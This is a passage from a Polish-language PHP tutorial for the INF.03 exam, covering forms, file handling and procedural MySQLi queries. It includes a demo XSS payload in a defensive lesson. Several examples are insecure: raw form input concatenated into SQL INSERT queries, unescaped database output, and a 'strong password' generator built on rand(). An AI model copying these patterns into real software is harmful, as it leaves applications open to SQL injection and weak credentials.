    // Timestamp dla konkretnej daty
    $timestamp = strtotime("2024-12-25");
    $timestamp = strtotime("+1 week");
    $timestamp = strtotime("-1 month");
    $timestamp = strtotime("next Monday");
?>
```

### **Praktyczne przykłady funkcji**

#### **Przykład 1: Kalkulator**

```php
<?php
    function kalkulator($a, $b, $operacja) {
        switch ($operacja) {
            case "+":
                return $a + $b;
            case "-":
                return $a - $b;
            case "*":
                return $a * $b;
            case "/":
                if ($b == 0) {
                    return "Błąd: dzielenie przez zero!";
                }
                return $a / $b;
            default:
                return "Nieznana operacja";
        }
    }
    
    echo kalkulator(10, 5, "+");  // 15
    echo kalkulator(10, 5, "-");  // 5
    echo kalkulator(10, 5, "*");  // 50
    echo kalkulator(10, 5, "/");  // 2
?>
```

#### **Przykład 2: Walidacja email**

```php
<?php
    function czyEmailPoprawny($email) {
        // Sprawdzenie za pomocą filter_var
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return true;
        }
        return false;
    }
    
    function walidujEmail($email) {
        $email = trim($email);
        
        if (empty($email)) {
            return "Email nie może być pusty";
        }
        
        if (!czyEmailPoprawny($email)) {
            return "Nieprawidłowy format email";
        }
        
        return true;  // Email poprawny
    }
    
    $wynik = walidujEmail("test@example.com");
    if ($wynik === true) {
        echo "Email poprawny!";
    } else {
        echo "Błąd: $wynik";
    }
?>
```

#### **Przykład 3: Generowanie silnego hasła**

```php
<?php
    function generujHaslo($dlugosc = 12) {
        $znaki = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
        $haslo = "";
        $maxIndex = strlen($znaki) - 1;
        
        for ($i = 0; $i < $dlugosc; $i++) {
            $haslo .= $znaki[rand(0, $maxIndex)];
        }
        
        return $haslo;
    }
    
    echo generujHaslo();      // np. aB3!xY9@kL2#
    echo generujHaslo(20);    // Dłuższe hasło
?>
```

#### **Przykład 4: Formatowanie ceny**

```php
<?php
    function formatujCene($cena, $waluta = "PLN") {
        $cenaFormatowana = number_format($cena, 2, ',', ' ');
        
        switch ($waluta) {
            case "PLN":
                return $cenaFormatowana . " zł";
            case "EUR":
                return "€" . $cenaFormatowana;
            case "USD":
                return "$" . $cenaFormatowana;
            default:
                return $cenaFormatowana . " " . $waluta;
        }
    }
    
    echo formatujCene(1234.56);         // 1 234,56 zł
    echo formatujCene(1234.56, "EUR");  // €1 234,56
    echo formatujCene(1234.56, "USD");  // $1 234,56
?>
```

#### **Przykład 5: Slug dla URL**

```php
<?php
    function utworzSlug($tekst) {
        // Zamiana na małe litery
        $slug = strtolower($tekst);
        
        // Zamiana polskich znaków
        $zamiana = [
            'ą' => 'a', 'ć' => 'c', 'ę' => 'e', 'ł' => 'l',
            'ń' => 'n', 'ó' => 'o', 'ś' => 's', 'ź' => 'z', 'ż' => 'z'
        ];
        $slug = strtr($slug, $zamiana);
        
        // Usunięcie wszystkiego oprócz liter, cyfr i spacji
        $slug = preg_replace('/[^a-z0-9\s]/', '', $slug);
        
        // Zamiana spacji na myślniki
        $slug = preg_replace('/\s+/', '-', $slug);
        
        // Usunięcie podwójnych myślników
        $slug = preg_replace('/-+/', '-', $slug);
        
        // Usunięcie myślników z początku i końca
        $slug = trim($slug, '-');
        
        return $slug;
    }
    
    echo utworzSlug("To jest tytuł artykułu!");
    // to-jest-tytul-artykulu
    
    echo utworzSlug("Żółta łódka płynie");
    // zolta-lodka-plynie
?>
```

---

## **9. Formularze - komunikacja z użytkownikiem**

Formularze HTML pozwalają użytkownikom wysyłać dane do serwera, gdzie PHP może je przetworzyć.

### **Podstawowy formularz HTML**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Formularz</title>
</head>
<body>
    <form method="POST" action="przetwarzanie.php">
        <label>Imię:</label>
        <input type="text" name="imie" required>
        <br><br>
        
        <label>Email:</label>
        <input type="email" name="email" required>
        <br><br>
        
        <label>Wiek:</label>
        <input type="number" name="wiek" min="1" max="150">
        <br><br>
        
        <button type="submit">Wyślij</button>
    </form>
</body>
</html>
```

**Ważne atrybuty:**
- `method` - metoda wysyłania (POST lub GET)
- `action` - plik PHP, który przetworzy dane
- `name` - nazwa pola (używana w PHP do odczytu)

### **Odbieranie danych - metoda POST**

Plik `przetwarzanie.php`:

```php
<?php
    // Sprawdzenie czy formularz został wysłany
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        
        // Odbieranie danych
        $imie = $_POST["imie"];
        $email = $_POST["email"];
        $wiek = $_POST["wiek"];
        
        // Wyświetlenie
        echo "<h2>Otrzymane dane:</h2>";
        echo "Imię: $imie<br>";
        echo "Email: $email<br>";
        echo "Wiek: $wiek lat<br>";
    } else {
        echo "Formularz nie został wysłany metodą POST";
    }
?>
```

### **Metoda GET vs POST**

#### **GET - dane w URL**

```html
<form method="GET" action="szukaj.php">
    <input type="text" name="fraza" placeholder="Szukaj...">
    <button type="submit">Szukaj</button>
</form>
```

```php
<?php
    // szukaj.php
    if (isset($_GET["fraza"])) {
        $fraza = $_GET["fraza"];
        echo "Szukasz: $fraza";
    }
    
    // URL będzie: szukaj.php?fraza=test
?>
```

#### **Porównanie GET vs POST**

| Cecha | GET | POST |
|-------|-----|------|
| Widoczność danych | W URL (widoczne) | Ukryte w ciele żądania |
| Długość danych | Ograniczona (~2000 znaków) | Praktycznie nieograniczona |
| Bezpieczeństwo | Niższe (dane w historii przeglądarki) | Wyższe |
| Zakładki | Można zapisać URL z danymi | Nie można |
| Użycie | Wyszukiwanie, filtrowanie | Formularze, logowanie, rejestracja |
| Przykład | `szukaj.php?fraza=test` | Dane ukryte |

### **Walidacja danych - BARDZO WAŻNE!**

ZAWSZE waliduj dane od użytkowników!

```php
<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        
        $imie = $_POST["imie"];
        $email = $_POST["email"];
        $wiek = $_POST["wiek"];
        
        $bledy = [];  // Tablica na błędy
        
        // 1. Sprawdzenie czy pole nie jest puste
        if (empty($imie)) {
            $bledy[] = "Imię jest wymagane";
        }
        
        // 2. Sprawdzenie długości
        if (strlen($imie) < 3) {
            $bledy[] = "Imię musi mieć co najmniej 3 znaki";
        }
        
        if (strlen($imie) > 50) {
            $bledy[] = "Imię może mieć maksymalnie 50 znaków";
        }
        
        // 3. Walidacja email
        if (empty($email)) {
            $bledy[] = "Email jest wymagany";
        } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $bledy[] = "Nieprawidłowy format email";
        }
        
        // 4. Sprawdzenie czy wiek jest liczbą
        if (!is_numeric($wiek)) {
            $bledy[] = "Wiek musi być liczbą";
        } elseif ($wiek < 1 || $wiek > 150) {
            $bledy[] = "Wiek musi być w przedziale 1-150";
        }
        
        // 5. Wyświetlenie błędów lub przetworzenie danych
        if (count($bledy) > 0) {
            echo "<h3>Znaleziono błędy:</h3><ul>";
            foreach ($bledy as $blad) {
                echo "<li>$blad</li>";
            }
            echo "</ul>";
        } else {
            echo "<h3>Dane są poprawne!</h3>";
            // Tutaj możesz zapisać dane do bazy
        }
    }
?>
```

### **Zabezpieczanie danych - htmlspecialchars()**

**ZAWSZE** używaj `htmlspecialchars()` przy wyświetlaniu danych od użytkowników!

```php
<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        
        // ŹLE - podatne na XSS!
        $komentarz = $_POST["komentarz"];
        echo $komentarz;  // Jeśli użytkownik wpisze <script>alert('XSS')</script>, wykona się!
        
        // DOBRZE - bezpieczne
        $komentarz = htmlspecialchars($_POST["komentarz"]);
        echo $komentarz;  // Tagi HTML zostaną zamienione na tekst
    }
?>
```

### **Przykład: Kompletny formularz kontaktowy**

**formularz.html:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Formularz kontaktowy</title>
    <style>
        .error { color: red; }
        .success { color: green; }
        label { display: block; margin-top: 10px; }
        input, textarea { width: 300px; padding: 5px; }
        button { margin-top: 15px; padding: 10px 20px; }
    </style>
</head>
<body>
    <h2>Formularz kontaktowy</h2>
    
    <form method="POST" action="kontakt.php">
        <label>Imię i nazwisko: *</label>
        <input type="text" name="imie" required>
        
        <label>Email: *</label>
        <input type="email" name="email" required>
        
        <label>Temat: *</label>
        <input type="text" name="temat" required>
        
        <label>Wiadomość: *</label>
        <textarea name="wiadomosc" rows="5" required></textarea>
        
        <button type="submit">Wyślij wiadomość</button>
    </form>
</body>
</html>
```

**kontakt.php:**
```php
<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        
        // Odbieranie i czyszczenie danych
        $imie = trim($_POST["imie"]);
        $email = trim($_POST["email"]);
        $temat = trim($_POST["temat"]);
        $wiadomosc = trim($_POST["wiadomosc"]);
        
        $bledy = [];
        
        // Walidacja
        if (empty($imie) || strlen($imie) < 3) {
            $bledy[] = "Imię i nazwisko musi mieć co najmniej 3 znaki";
        }
        
        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $bledy[] = "Nieprawidłowy adres email";
        }
        
        if (empty($temat) || strlen($temat) < 5) {
            $bledy[] = "Temat musi mieć co najmniej 5 znaków";
        }
        
        if (empty($wiadomosc) || strlen($wiadomosc) < 10) {
            $bledy[] = "Wiadomość musi mieć co najmniej 10 znaków";
        }
        
        // Wyświetlenie wyniku
        if (count($bledy) > 0) {
            echo "<div class='error'>";
            echo "<h3>Formularz zawiera błędy:</h3><ul>";
            foreach ($bledy as $blad) {
                echo "<li>$blad</li>";
            }
            echo "</ul></div>";
            echo "<a href='formularz.html'>Wróć do formularza</a>";
        } else {
            // Zabezpieczenie danych
            $imie = htmlspecialchars($imie);
            $email = htmlspecialchars($email);
            $temat = htmlspecialchars($temat);
            $wiadomosc = htmlspecialchars($wiadomosc);
            
            echo "<div class='success'>";
            echo "<h3>Wiadomość wysłana pomyślnie!</h3>";
            echo "<p><strong>Od:</strong> $imie ($email)</p>";
            echo "<p><strong>Temat:</strong> $temat</p>";
            echo "<p><strong>Wiadomość:</strong><br>$wiadomosc</p>";
            echo "</div>";
            
            // Tutaj możesz wysłać email lub zapisać do bazy
        }
    } else {
        echo "Nieprawidłowe żądanie";
    }
?>
```

### **Pozostałe typy pól formularza**

```html
<!-- Pole tekstowe wielolinijkowe -->
<textarea name="opis" rows="5" cols="40"></textarea>

<!-- Pole wyboru (checkbox) -->
<input type="checkbox" name="zgoda" value="tak"> Zgadzam się

<!-- Przyciski radio -->
<input type="radio" name="plec" value="mezczyzna"> Mężczyzna
<input type="radio" name="plec" value="kobieta"> Kobieta

<!-- Lista rozwijana (select) -->
<select name="miasto">
    <option value="">Wybierz miasto</option>
    <option value="warszawa">Warszawa</option>
    <option value="krakow">Kraków</option>
    <option value="gdansk">Gdańsk</option>
</select>

<!-- Pole ukryte -->
<input type="hidden" name="user_id" value="123">

<!-- Pole hasła -->
<input type="password" name="haslo">

<!-- Pole daty -->
<input type="date" name="data_urodzenia">

<!-- Pole koloru -->
<input type="color" name="kolor">

<!-- Pole pliku -->
<input type="file" name="zdjecie">
```

**Odbieranie w PHP:**

```php
<?php
    // Textarea
    $opis = $_POST["opis"];
    
    // Checkbox
    if (isset($_POST["zgoda"])) {
        echo "Użytkownik zaznaczył zgodę";
    }
    
    // Radio
    $plec = $_POST["plec"];  // "mezczyzna" lub "kobieta"
    
    // Select
    $miasto = $_POST["miasto"];
    
    // Hidden
    $userId = $_POST["user_id"];
    
    // Password
    $haslo = $_POST["haslo"];
    
    // Date
    $dataUrodzenia = $_POST["data_urodzenia"];  // Format: YYYY-MM-DD
    
    // Color
    $kolor = $_POST["kolor"];  // Format: #rrggbb
?>
```

### **Formularze z wielokrotnym wyborem**

```html
<!-- Checkbox - wiele wartości -->
<label>Wybierz zainteresowania:</label>
<input type="checkbox" name="zainteresowania[]" value="sport"> Sport
<input type="checkbox" name="zainteresowania[]" value="muzyka"> Muzyka
<input type="checkbox" name="zainteresowania[]" value="film"> Film
<input type="checkbox" name="zainteresowania[]" value="ksiazki"> Książki

<!-- Select - wielokrotny wybór -->
<select name="jezyki[]" multiple>
    <option value="php">PHP</option>
    <option value="python">Python</option>
    <option value="javascript">JavaScript</option>
    <option value="java">Java</option>
</select>
```

**Odbieranie w PHP:**

```php
<?php
    // Checkboxy - tablica
    if (isset($_POST["zainteresowania"])) {
        $zainteresowania = $_POST["zainteresowania"];  // Tablica
        
        foreach ($zainteresowania as $zainteresowanie) {
            echo "- $zainteresowanie<br>";
        }
    }
    
    // Select multiple - tablica
    if (isset($_POST["jezyki"])) {
        $jezyki = $_POST["jezyki"];  // Tablica
        
        echo "Wybrane języki: " . implode(", ", $jezyki);
    }
?>
```

---

## **10. Praca z plikami**

PHP pozwala na pełną manipulację plikami na serwerze - odczyt, zapis, modyfikację, usuwanie.

### **Sprawdzanie istnienia pliku**

```php
<?php
    if (file_exists("plik.txt")) {
        echo "Plik istnieje";
    } else {
        echo "Plik nie istnieje";
    }
    
    // Sprawdzenie czy to plik czy folder
    if (is_file("plik.txt")) {
        echo "To jest plik";
    }
    
    if (is_dir("folder")) {
        echo "To jest folder";
    }
?>
```

### **Odczyt całego pliku**

```php
<?php
    // Sposób 1: file_get_contents() - cały plik jako string
    $zawartosc = file_get_contents("plik.txt");
    echo $zawartosc;
    
    // Bezpieczniej - sprawdź czy plik istnieje
    if (file_exists("plik.txt")) {
        $zawartosc = file_get_contents("plik.txt");
        echo htmlspecialchars($zawartosc);  // Zabezpieczenie
    } else {
        echo "Plik nie istnieje";
    }
    
    // Sposób 2: file() - cały plik jako tablica linii
    $linie = file("plik.txt");
    foreach ($linie as $numer => $linia) {
        echo "Linia " . ($numer + 1) . ": " . htmlspecialchars($linia) . "<br>";
    }
?>
```

### **Zapis do pliku**

```php
<?php
    // Sposób 1: file_put_contents() - nadpisuje zawartość
    $tekst = "To jest nowa zawartość pliku\n";
    file_put_contents("plik.txt", $tekst);
    
    // Sposób 2: file_put_contents() z FILE_APPEND - dopisuje na końcu
    $nowyTekst = "To zostanie dopisane\n";
    file_put_contents("plik.txt", $nowyTekst, FILE_APPEND);
    
    // Sprawdzenie czy udało się zapisać
    if (file_put_contents("plik.txt", $tekst) !== false) {
        echo "Plik zapisany pomyślnie";
    } else {
        echo "Błąd zapisu";
    }
?>
```

### **Praca z plikami - tryby fopen()**

```php
<?php
    // Tryby otwarcia pliku:
    // "r"  - Odczyt, wskaźnik na początku
    // "r+" - Odczyt i zapis, wskaźnik na początku
    // "w"  - Zapis, tworzy plik lub czyści zawartość
    // "w+" - Odczyt i zapis, tworzy plik lub czyści zawartość
    // "a"  - Dopisywanie, wskaźnik na końcu
    // "a+" - Odczyt i dopisywanie, wskaźnik na końcu
    
    // Odczyt pliku linia po linii
    $plik = fopen("plik.txt", "r");
    
    if ($plik) {
        while (($linia = fgets($plik)) !== false) {
            echo htmlspecialchars($linia) . "<br>";
        }
        fclose($plik);  // WAŻNE! Zawsze zamykaj plik
    } else {
        echo "Nie można otworzyć pliku";
    }
    
    // Zapis do pliku
    $plik = fopen("nowy.txt", "w");
    
    if ($plik) {
        fwrite($plik, "Pierwsza linia\n");
        fwrite($plik, "Druga linia\n");
        fwrite($plik, "Trzecia linia\n");
        fclose($plik);
        echo "Plik zapisany";
    }
?>
```

### **Praktyczny przykład - licznik odwiedzin**

```php
<?php
    $plik = "licznik.txt";
    
    // Odczyt aktualnej wartości
    if (file_exists($plik)) {
        $licznik = (int)file_get_contents($plik);
    } else {
        $licznik = 0;
    }
    
    // Zwiększenie licznika
    $licznik++;
    
    // Zapis nowej wartości
    file_put_contents($plik, $licznik);
    
    echo "Liczba odwiedzin: $licznik";
?>
```

### **Operacje na plikach**

```php
<?php
    // Kopiowanie pliku
    copy("zrodlo.txt", "kopia.txt");
    
    // Przenoszenie/zmiana nazwy
    rename("stara_nazwa.txt", "nowa_nazwa.txt");
    
    // Usuwanie pliku
    unlink("plik_do_usuniecia.txt");
    
    // Informacje o pliku
    $rozmiar = filesize("plik.txt");  // Rozmiar w bajtach
    echo "Rozmiar: " . ($rozmiar / 1024) . " KB";
    
    $czas = filemtime("plik.txt");  // Timestamp ostatniej modyfikacji
    echo "Ostatnia modyfikacja: " . date("Y-m-d H:i:s", $czas);
?>
```

### **Praca z katalogami**

```php
<?php
    // Tworzenie katalogu
    if (!file_exists("nowy_folder")) {
        mkdir("nowy_folder");
        echo "Folder utworzony";
    }
    
    // Tworzenie zagnieżdżonych katalogów
    mkdir("folder/podfolder/kolejny", 0777, true);
    
    // Usuwanie pustego katalogu
    rmdir("pusty_folder");
    
    // Listowanie plików w katalogu
    $pliki = scandir(".");  // "." = aktualny katalog
    
    foreach ($pliki as $plik) {
        if ($plik != "." && $plik != "..") {
            echo "$plik<br>";
        }
    }
    
    // Lub z glob (z filtrowaniem)
    $plikiTxt = glob("*.txt");  // Wszystkie pliki .txt
    foreach ($plikiTxt as $plik) {
        echo "$plik<br>";
    }
?>
```

### **Praktyczny przykład - prosty dziennik (log)**

```php
<?php
    function zapiszLog($wiadomosc) {
        $plik = "dziennik.log";
        $czas = date("Y-m-d H:i:s");
        $wpis = "[$czas] $wiadomosc\n";
        
        file_put_contents($plik, $wpis, FILE_APPEND);
    }
    
    // Użycie
    zapiszLog("Użytkownik zalogował się");
    zapiszLog("Użytkownik zmienił hasło");
    zapiszLog("Użytkownik wylogował się");
    
    // Odczyt logu
    if (file_exists("dziennik.log")) {
        echo "<pre>";
        echo htmlspecialchars(file_get_contents("dziennik.log"));
        echo "</pre>";
    }
?>
```

---

## **11. Bazy danych MySQL - STYL PROCEDURALNY (EGZAMIN INF.03)**

### **Czym jest baza danych?**

Baza danych to uporządkowany zbiór danych. MySQL to system zarządzania relacyjnymi bazami danych.

**Podstawowe pojęcia:**
- **Baza danych** - kolekcja tabel
- **Tabela** - zbiór rekordów (wierszy)
- **Rekord** - pojedynczy wiersz danych
- **Kolumna** - pole w tabeli (np. imię, email, wiek)

### **Połączenie z bazą danych - mysqli_connect()**

**To jest DOKŁADNIE tak jak na egzaminie INF.03!**

```php
<?php
    // Parametry połączenia
    $host = "localhost";        // Adres serwera MySQL
    $uzytkownik = "root";       // Nazwa użytkownika
    $haslo = "";                // Hasło (domyślnie puste w XAMPP)
    $nazwaBazy = "mojabaza";    // Nazwa bazy danych
    
    // Połączenie z bazą
    $conn = mysqli_connect($host, $uzytkownik, $haslo, $nazwaBazy);
    
    // Sprawdzenie połączenia
    if (!$conn) {
        die("Błąd połączenia: " . mysqli_connect_error());
    }
    
    echo "Połączono pomyślnie!";
    
    // Ustawienie kodowania UTF-8 (WAŻNE dla polskich znaków!)
    mysqli_set_charset($conn, "utf8");
    
    // Na końcu skryptu ZAWSZE zamykaj połączenie!
    mysqli_close($conn);
?>
```

**WAŻNE dla egzaminu:**
- ✅ Zawsze używaj `mysqli_connect()` (nie `mysql_connect()` - to stara funkcja!)
- ✅ Sprawdzaj połączenie: `if (!$conn)`
- ✅ ZAWSZE zamykaj: `mysqli_close($conn)` - to OBOWIĄZKOWE na egzaminie!
- ✅ Ustawiaj UTF-8: `mysqli_set_charset($conn, "utf8")` dla polskich znaków

### **SELECT - pobieranie danych (najważniejsze na egzaminie!)**

#### **Podstawowy SELECT - wyświetlanie wszystkich rekordów**

```php
<?php
    // 1. Połączenie
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // 2. Zapytanie SQL
    $sql = "SELECT * FROM uzytkownicy";
    
    // 3. Wykonanie zapytania
    $wynik = mysqli_query($conn, $sql);
    
    // 4. Sprawdzenie czy są wyniki
    if (mysqli_num_rows($wynik) > 0) {
        
        // 5. Wyświetlanie w tabeli HTML
        echo "<table border='1'>";
        echo "<tr><th>ID</th><th>Imię</th><th>Email</th><th>Wiek</th></tr>";
        
        // 6. Pętla WHILE - pobieranie każdego wiersza
        while ($wiersz = mysqli_fetch_array($wynik)) {
            echo "<tr>";
            echo "<td>" . $wiersz["id"] . "</td>";
            echo "<td>" . $wiersz["imie"] . "</td>";
            echo "<td>" . $wiersz["email"] . "</td>";
            echo "<td>" . $wiersz["wiek"] . "</td>";
            echo "</tr>";
        }
        
        echo "</table>";
        
    } else {
        echo "Brak wyników";
    }
    
    // 7. ZAMKNIJ POŁĄCZENIE (OBOWIĄZKOWO!)
    mysqli_close($conn);
?>
```

**Krok po kroku - jak to działa:**

1. `mysqli_connect()` - łączy z bazą
2. Tworzymy zapytanie SQL w zmiennej `$sql`
3. `mysqli_query()` - wykonuje zapytanie, zwraca wynik
4. `mysqli_num_rows()` - sprawdza ile wierszy zwrócono
5. `mysqli_fetch_array()` - pobiera jeden wiersz jako tablicę
6. Pętla `while` - przechodzi przez wszystkie wiersze
7. `mysqli_close()` - zamyka połączenie

#### **SELECT z warunkiem WHERE**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Pobierz tylko użytkowników starszych niż 18 lat
    $sql = "SELECT * FROM uzytkownicy WHERE wiek > 18";
    $wynik = mysqli_query($conn, $sql);
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["imie"] . " ma " . $wiersz["wiek"] . " lat<br>";
    }
    
    mysqli_close($conn);
?>
```

#### **SELECT z LIKE (wyszukiwanie)**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Znajdź wszystkich użytkowników których imię zaczyna się na "A"
    $sql = "SELECT * FROM uzytkownicy WHERE imie LIKE 'A%'";
    $wynik = mysqli_query($conn, $sql);
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["imie"] . "<br>";
    }
    
    mysqli_close($conn);
?>
```

**Wzorce w LIKE:**
- `'A%'` - zaczyna się na A (Anna, Adam, Agata)
- `'%a'` - kończy się na a (Anna, Maria, Ola)
- `'%an%'` - zawiera "an" (Anna, Jan, Joanna)

#### **SELECT z ORDER BY (sortowanie)**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Sortowanie alfabetyczne po imieniu
    $sql = "SELECT * FROM uzytkownicy ORDER BY imie ASC";
    $wynik = mysqli_query($conn, $sql);
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["imie"] . "<br>";
    }
    
    mysqli_close($conn);
?>
```

- `ASC` - rosnąco (A-Z, 0-9)
- `DESC` - malejąco (Z-A, 9-0)

#### **SELECT z LIMIT (ograniczenie wyników)**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Pobierz tylko 5 pierwszych użytkowników
    $sql = "SELECT * FROM uzytkownicy LIMIT 5";
    $wynik = mysqli_query($conn, $sql);
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["imie"] . "<br>";
    }
    
    mysqli_close($conn);
?>
```

### **INSERT - dodawanie danych**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Dane do wstawienia
    $imie = "Jan";
    $email = "jan@example.com";
    $wiek = 25;
    
    // Zapytanie INSERT
    $sql = "INSERT INTO uzytkownicy (imie, email, wiek) 
            VALUES ('$imie', '$email', $wiek)";
    
    // Wykonanie zapytania
    if (mysqli_query($conn, $sql)) {
        echo "Dodano użytkownika pomyślnie!";
        
        // Pobranie ID ostatnio dodanego rekordu
        $ostatnieID = mysqli_insert_id($conn);
        echo " Nowe ID: $ostatnieID";
    } else {
        echo "Błąd: " . mysqli_error($conn);
    }
    
    mysqli_close($conn);
?>
```

#### **INSERT z danymi z formularza**

```php
<?php
    // Odbieranie danych z formularza
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        
        $conn = mysqli_connect("localhost", "root", "", "mojabaza");
        
        // Pobierz dane z formularza
        $imie = $_POST["imie"];
        $email = $_POST["email"];
        $wiek = $_POST["wiek"];
        
        // Zapytanie INSERT
        $sql = "INSERT INTO uzytkownicy (imie, email, wiek) 
                VALUES ('$imie', '$email', $wiek)";
        
        if (mysqli_query($conn, $sql)) {
            echo "Dane zapisane!";
        } else {
            echo "Błąd: " . mysqli_error($conn);
        }
        
        mysqli_close($conn);
    }
?>

<!-- Formularz HTML -->
<form method="POST">
    <input type="text" name="imie" placeholder="Imię" required><br>
    <input type="email" name="email" placeholder="Email" required><br>
    <input type="number" name="wiek" placeholder="Wiek" required><br>
    <button type="submit">Dodaj</button>
</form>
```

### **UPDATE - aktualizacja danych**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Zaktualizuj wiek użytkownika o ID = 1
    $nowyWiek = 26;
    $userId = 1;
    
    $sql = "UPDATE uzytkownicy SET wiek = $nowyWiek WHERE id = $userId";
    
    if (mysqli_query($conn, $sql)) {
        $ilosc = mysqli_affected_rows($conn);
        echo "Zaktualizowano $ilosc rekord(ów)";
    } else {
        echo "Błąd: " . mysqli_error($conn);
    }
    
    mysqli_close($conn);
?>
```

**mysqli_affected_rows()** - zwraca liczbę zmienionych wierszy (WAŻNE na egzaminie!)

### **DELETE - usuwanie danych**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Usuń użytkownika o ID = 1
    $userId = 1;
    
    $sql = "DELETE FROM uzytkownicy WHERE id = $userId";
    
    if (mysqli_query($conn, $sql)) {
        $ilosc = mysqli_affected_rows($conn);
        echo "Usunięto $ilosc rekord(ów)";
    } else {
        echo "Błąd: " . mysqli_error($conn);
    }
    
    mysqli_close($conn);
?>
```

### **Funkcje agregujące SQL (często na egzaminie!)**

#### **COUNT - liczenie rekordów**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Policz wszystkich użytkowników
    $sql = "SELECT COUNT(*) as ilosc FROM uzytkownicy";
    $wynik = mysqli_query($conn, $sql);
    $wiersz = mysqli_fetch_array($wynik);
    
    echo "Liczba użytkowników: " . $wiersz["ilosc"];
    
    mysqli_close($conn);
?>
```

#### **AVG - średnia**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Średni wiek użytkowników
    $sql = "SELECT AVG(wiek) as sredni_wiek FROM uzytkownicy";
    $wynik = mysqli_query($conn, $sql);
    $wiersz = mysqli_fetch_array($wynik);
    
    echo "Średni wiek: " . round($wiersz["sredni_wiek"], 2);
    
    mysqli_close($conn);
?>
```

#### **SUM - suma**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Suma wszystkich cen w tabeli produkty
    $sql = "SELECT SUM(cena) as suma FROM produkty";
    $wynik = mysqli_query($conn, $sql);
    $wiersz = mysqli_fetch_array($wynik);
    
    echo "Suma cen: " . $wiersz["suma"] . " zł";
    
    mysqli_close($conn);
?>
```

#### **MIN i MAX**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Najmłodszy i najstarszy użytkownik
    $sql = "SELECT MIN(wiek) as min_wiek, MAX(wiek) as max_wiek FROM uzytkownicy";
    $wynik = mysqli_query($conn, $sql);
    $wiersz = mysqli_fetch_array($wynik);
    
    echo "Najmłodszy: " . $wiersz["min_wiek"] . " lat<br>";
    echo "Najstarszy: " . $wiersz["max_wiek"] . " lat";
    
    mysqli_close($conn);
?>
```

### **JOIN - łączenie tabel (BARDZO WAŻNE na egzaminie!)**

#### **INNER JOIN - podstawowe łączenie**

Przykład: Mamy dwie tabele:
- `uzytkownicy` (id, imie)
- `zamowienia` (id, uzytkownik_id, produkt, cena)

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Pokaż wszystkie zamówienia wraz z imionami użytkowników
    $sql = "SELECT uzytkownicy.imie, zamowienia.produkt, zamowienia.cena 
            FROM zamowienia 
            INNER JOIN uzytkownicy ON zamowienia.uzytkownik_id = uzytkownicy.id";
    
    $wynik = mysqli_query($conn, $sql);
    
    echo "<table border='1'>";
    echo "<tr><th>Imię</th><th>Produkt</th><th>Cena</th></tr>";
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo "<tr>";
        echo "<td>" . $wiersz["imie"] . "</td>";
        echo "<td>" . $wiersz["produkt"] . "</td>";
        echo "<td>" . $wiersz["cena"] . " zł</td>";
        echo "</tr>";
    }
    
    echo "</table>";
    
    mysqli_close($conn);
?>
```

#### **LEFT JOIN - wszystkie z lewej tabeli**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "sklep");
    
    // Pokaż wszystkich użytkowników i ich zamówienia (jeśli mają)
    $sql = "SELECT uzytkownicy.imie, zamowienia.produkt 
            FROM uzytkownicy 
            LEFT JOIN zamowienia ON uzytkownicy.id = zamowienia.uzytkownik_id";
    
    $wynik = mysqli_query($conn, $sql);
    
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["imie"];
        if ($wiersz["produkt"]) {
            echo " - zamówił: " . $wiersz["produkt"];
        } else {
            echo " - brak zamówień";
        }
        echo "<br>";
    }
    
    mysqli_close($conn);
?>
```

### **Funkcje daty i czasu w SQL (na egzaminie!)**

```php
<?php
    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
    
    // Aktualna data
    $sql = "SELECT CURRENT_DATE() as dzisiaj";
    $wynik = mysqli_query($conn, $sql);
    $wiersz = mysqli_fetch_array($wynik);
    echo "Dzisiaj: " . $wiersz["dzisiaj"] . "<br>";
    
    // Aktualny czas
    $sql = "SELECT CURRENT_TIME() as teraz";
    $wynik = mysqli_query($conn, $sql);
    $wiersz = mysqli_fetch_array($wynik);
    echo "Teraz: " . $wiersz["teraz"] . "<br>";
    
    // Aktualna data i czas
    $sql = "SELECT NOW() as teraz";
    $wynik = mysqli_query($conn, $sql);
    $wiersz = mysqli_fetch_array($wynik);
    echo "Teraz: " . $wiersz["teraz"];
    
    mysqli_close($conn);
?>
```

### **GROUP BY - grupowanie wyników (BARDZO WAŻNE NA EGZAMINIE!)**

GROUP BY pozwala grupować wiersze i używać funkcji agregujących. **To jest BARDZO CZĘSTO na egzaminie INF.03!**

